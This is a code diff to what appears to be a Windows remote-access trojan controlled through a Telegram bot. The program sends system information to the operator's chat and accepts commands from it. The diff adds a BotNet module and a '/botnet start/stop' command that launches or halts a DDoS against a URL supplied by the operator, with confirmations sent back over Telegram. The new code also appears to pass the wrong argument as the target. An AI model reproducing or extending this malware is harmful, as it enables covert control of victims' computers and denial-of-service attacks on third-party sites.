@@ -35,6 +35,8 @@ SOFTWARE.
 
 #include "Information.h"
 
+#include "BotNet.h"
+
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 	srand((unsigned int)time(NULL));
 	Settings s;
@@ -97,6 +99,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 		RegCloseKey(hKey);
 
 		Telegram api(s.botapi);
+		BotNet botnet;
 
 		SYSTEM_INFO SysInfo;
 		GetSystemInfo(&SysInfo);
@@ -314,6 +317,22 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 			}
 			else if (last == "/online") {
 				api.SendTextMessage(s.chatid, information.c_str());
+			}
+
+			//    0         1              2
+			// /botnet start/stop https://google.com
+			else if (last.substr(0, 7) == "/botnet") {
+				std::vector<std::string> params = split(last, ' ');
+				if (params[1] == "start") {
+					botnet.Start((char*)params[1].c_str());
+					std::string text = prefix + ": Started BotNet DDOS!";
+					api.SendTextMessage(s.chatid, text.c_str());
+				}
+				else if (params[1] == "stop") {
+					botnet.Stop();
+					std::string text = prefix + ": Stopped BotNet DDOS!";
+					api.SendTextMessage(s.chatid, text.c_str());
+				}
 			}
 		}
 	}
